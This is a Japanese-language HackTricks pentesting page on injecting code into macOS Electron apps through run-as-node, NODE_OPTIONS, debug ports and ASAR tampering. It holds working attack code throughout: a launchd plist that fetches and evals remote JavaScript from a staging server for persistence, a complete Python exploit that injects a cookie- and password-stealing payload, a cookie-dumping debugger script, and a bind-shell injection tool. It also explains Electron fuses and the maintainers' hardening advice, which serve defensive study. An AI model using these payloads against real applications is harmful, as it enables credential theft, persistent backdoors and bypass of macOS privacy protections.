# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Electron について知らない場合は、[**こちらに多くの情報があります**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation)。ここでは、Electron が **node** を実行することだけ覚えておいてください。\
また、node には、指定されたファイル以外のコードを**実行させる**ために使える **パラメーター**と**環境変数**があります。

クロスプラットフォームで必要となるローカル書き込みの前提条件、および ASAR/V8 snapshot のパスについては、[Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md)を参照してください。

### Electron Fuses

これらの手法については次に説明しますが、近年 Electron には、それらを**防ぐためのセキュリティフラグ**がいくつか追加されています。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)と呼ばれ、macOS の Electron アプリが**任意のコードを読み込むことを防ぐ**ために使用されるのは次のフラグです:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: 無効にすると、コードの注入に環境変数 **`ELECTRON_RUN_AS_NODE`** を使えなくなります。
- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`、`--inspect-brk` などのパラメーターが無視されます。これによるコード注入を防ぎます。
- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれる **`asar`** **ファイル**が macOS によって**検証**されます。これにより、このファイルの内容を変更して行う**コード injection**を**防ぎます**。
- **`OnlyLoadAppFromAsar`**: 有効にすると、**`app.asar`**、**`app`**、最後に **`default_app.asar`** の順に検索して読み込む代わりに、app.asar のみを確認して使用します。したがって、**`embeddedAsarIntegrityValidation`** fuse と**組み合わせる**ことで、**検証されていないコードを読み込むことが不可能**になります。
- **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、browser process は V8 snapshot として `browser_v8_context_snapshot.bin` というファイルを使用します。

コード注入を防ぐものではありませんが、ほかにも興味深い fuse があります。

- **EnableCookieEncryption**: 有効にすると、ディスク上の cookie store は OS レベルの暗号化キーを使って暗号化されます。

### Electron Fuses の確認

アプリケーションからこれらの**フラグを確認**するには、次を実行します。

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Electron Fuses の変更

[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuses** の設定は、文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** を含む **Electron binary** 内に保存されています。<sup>[[1]](#references)</sup>

macOS アプリケーションでは、通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

このファイルを [https://hexed.it/](https://hexed.it/) で開き、前述の文字列を検索できます。この文字列の後には、各 fuse が無効か有効かを示す ASCII の数字「0」または「1」があります。16 進コード（`0x30` は `0`、`0x31` は `1`）を変更して、**fuse の値を変更**できます。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

変更したこれらのバイトを使って、アプリケーション内の **`Electron Framework` バイナリ**を**上書き**しようとすると、アプリは起動しません。

## Electron Applications にコードを追加する RCE

Electron App が使用する**外部の JS/HTML ファイル**が存在する場合があります。攻撃者は、署名がチェックされないこれらのファイルにコードを注入し、アプリのコンテキストで任意のコードを実行できます。

> [!CAUTION]
> ただし、現時点では 2 つの制限があります。
>
> - App を変更するには **`kTCCServiceSystemPolicyAppBundles`** 権限が**必要**なため、デフォルトではこれはできなくなっています。
> - コンパイル済みの **`asap`** ファイルでは通常、fuse の **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** が**有効**になっています。
>
> そのため、この攻撃経路はより複雑になります（または不可能になります）。

**`kTCCServiceSystemPolicyAppBundles`** の要件は、アプリケーションを別のディレクトリ（**`/tmp`** など）にコピーし、フォルダー **`app.app/Contents`** の名前を **`app.app/NotCon`** に変更してから、**悪意のある**コードで **asar** ファイルを**変更**し、名前を **`app.app/Contents`** に戻して実行することで回避できます。<sup>[[5]](#references)</sup>

asar ファイルからコードを展開するには、次のコマンドを使います。

```bash
npx asar extract app.asar app-decomp
```

変更を加えた後、次の方法で再度パッケージ化します：

```bash
npx asar pack app-decomp app-new.asar
```

## ELECTRON_RUN_AS_NODEによるRCE

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)によると、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして起動します。<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> fuse **`RunAsNode`** が無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、これは機能しません。

### App PlistからのInjection

[**こちらで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、plist内でこの環境変数を悪用してpersistenceを維持できます：<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## `NODE_OPTIONS`によるRCE

ペイロードを別のファイルに保存して実行できます。

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> fuse **`EnableNodeOptionsEnvironmentVariable`** が**無効**の場合、環境変数 **NODE_OPTIONS** は、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、アプリの起動時に**無視**されます。また、fuse **`RunAsNode`** が無効の場合、**`ELECTRON_RUN_AS_NODE`** も**無視**されます。
>
> **`ELECTRON_RUN_AS_NODE`** を設定しない場合、次の**エラー**が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist からの Injection

この環境変数を plist で悪用し、次のキーを追加して persistence を維持できます:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## inspectを利用したRCE

[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`**などのフラグを指定してElectronアプリケーションを実行すると、**デバッグポートが開く**ため、そこに接続できます（たとえば、Chromeの`chrome://inspect`から）。また、**コードを注入**したり、新しいプロセスを起動したりすることもできます。<sup>[[7]](#references)</sup>\
例：

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

[**このブログ記事**](https://hackerone.com/reports/1274695)では、このデバッグ機能を悪用して、Headless Chromeに**任意の場所へ任意のファイルをダウンロード**させています。<sup>[[8]](#references)</sup>

> [!TIP]
> アプリが環境変数や`--inspect`などのパラメータが設定されているかを独自の方法でチェックしている場合、引数`--inspect-brk`を使って実行時に**bypass**できる可能性があります。この引数はアプリの実行開始時に**実行を停止**するため、その間にbypassを実行できます（たとえば、現在のプロセスの引数や環境変数を上書きします）。

以下は、`--inspect-brk`パラメータを指定してアプリを監視・実行することで、アプリ独自の保護機能をbypass（プロセスのパラメータを上書きして`--inspect-brk`を削除）し、さらにJS payloadを注入してアプリからCookieと認証情報をダンプできたexploitです：

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> fuse **`EnableNodeCliInspectArguments`**が無効の場合、環境変数 **`ELECTRON_RUN_AS_NODE`**が設定されていない限り、アプリ起動時に node パラメータ（`--inspect`など）は**無視されます**。また、fuse **`RunAsNode`**が無効の場合、この環境変数も**無視されます**。
>
> ただし、**electron パラメータ `--remote-debugging-port=9229`**は引き続き使用できますが、先ほどのpayloadでは他のプロセスを実行できません。

パラメータ **`--remote-debugging-port=9222`**を使用すると、履歴（GETコマンドを使用）やブラウザのcookie（ブラウザ内で**復号**されており、それらを返す**json endpoint**がある）など、Electron Appから情報を盗むことができます。

その方法は[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学べます。また、自動化ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)や、次のような簡単なスクリプトを使用できます。<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### App PlistからのInjection

plist内でこの環境変数を悪用し、次のキーを追加することで永続化できます:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## 古いバージョンを悪用したTCC Bypass

> [!TIP]
> macOSのTCCデーモンは、実行されたアプリケーションのバージョンをチェックしません。そのため、これまでの手法で**Electronアプリケーションにコードをインジェクションできない場合**は、以前のバージョンのアプリをダウンロードして、そこにコードをインジェクションできます。TCC権限は引き続き付与されます（Trust Cacheによって阻止されない限り）。

## JS以外のコードを実行する

これまでの手法を使えば、**Electronアプリケーションのプロセス内でJSコードを実行**できます。ただし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルで実行され、TCC権限を継承する**ことを忘れないでください。\
したがって、たとえばエンタイトルメントを悪用してカメラやマイクにアクセスしたい場合は、**プロセスから別のバイナリを実行する**だけで済みます。

## 2023～2024年に注目されたElectron macOSの脆弱性

### CVE-2023-44402 – ASARの整合性チェックのバイパス

Electron ≤22.3.23および23～27の各種プレリリースでは、`.app/Contents/Resources`フォルダーへの書き込み権限を持つ攻撃者が、`embeddedAsarIntegrityValidation` **および** `onlyLoadAppFromAsar` fuseをバイパスできました。このバグは整合性チェッカーの *file-type confusion* に起因するもので、細工された**`app.asar`という名前のディレクトリ**が検証済みアーカイブの代わりに読み込まれ、そのディレクトリ内に置かれたJavaScriptがアプリ起動時に実行されてしまいます。そのため、ハードニングガイダンスに従って両方のfuseを有効にしていたベンダーのアプリも、macOS上では依然として脆弱でした。<sup>[[3]](#references)</sup>

修正済みのElectronバージョン: **22.3.24**、**24.8.3**、**25.8.1**、**26.2.1**、**27.0.0-alpha.7**。古いビルドを実行しているアプリケーションを見つけた攻撃者は、`Contents/Resources/app.asar`を独自のディレクトリで上書きし、アプリケーションのTCCエンタイトルメントでコードを実行できます。<sup>[[3]](#references)</sup> 

### 2024年の「RunAsNode」/「enableNodeCliInspectArguments」CVE群

2024年1月、複数のCVE（CVE-2024-23738からCVE-2024-23743）により、多くのElectronアプリが**RunAsNode**と**EnableNodeCliInspectArguments**のfuseを有効にしたまま配布されていることが明らかになりました。そのため、ローカルの攻撃者は環境変数`ELECTRON_RUN_AS_NODE=1`や`--inspect-brk`などのフラグを使ってプログラムを再起動し、*汎用の*Node.jsプロセスとして動作させ、アプリケーションのサンドボックス権限とTCC権限をすべて継承できます。<sup>[[4]](#references)</sup>

Electronチームは「critical」という評価に異議を唱え、攻撃者にはすでにローカルでのコード実行が必要だと指摘しました。しかし、侵入後の活動では依然として有用です。脆弱なElectronバンドルを、デスクトップアプリに以前許可された連絡先、写真などの機密リソースを読み取れる *living-off-the-land* バイナリに変えられるためです。<sup>[[4]](#references)</sup>

Electronメンテナーによる防御ガイダンス:<sup>[[4]](#references)</sup>

* 本番ビルドでは`RunAsNode`と`EnableNodeCliInspectArguments`のfuseを無効にする。
* アプリケーションでヘルパーNode.jsプロセスが正当に必要な場合は、これらのfuseを再び有効にするのではなく、新しい**UtilityProcess** APIを使用する。 

## 自動インジェクション

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r)ツールを使うと、インストール済みの**脆弱なElectronアプリケーションを検出**し、コードをインジェクションできます。このツールは**`--inspect`**手法を試します:<sup>[[5]](#references)</sup>

自分でコンパイルする必要があります。次のように使用できます:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki は Electron アプリケーションに backdoor を仕込むために設計されており、アプリケーションの JavaScript ファイルを Loki の Command & Control JavaScript ファイルに置き換えます。

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [サードパーティ製フレームワーク経由の macOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ファイルタイプの混同による ASAR Integrity の bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [「runAsNode」CVE に関する声明 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - macOS Privacy を Electron 化する - Red Team の武器庫に加わる新たな武器 - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [環境変数 | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron アプリが秘密情報を機密に保管できない理由: --inspect オプション](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron のデバッグ機能を悪用して任意のファイルをダウンロード](https://hackerone.com/reports/1274695)
- [9] [Cookie Jar に手を入れる: Chromium の Remote Debugger Port を使った Cookie のダンプ - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium の Remote Debugger を使った Cookie ダンプの失敗をデバッグする - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
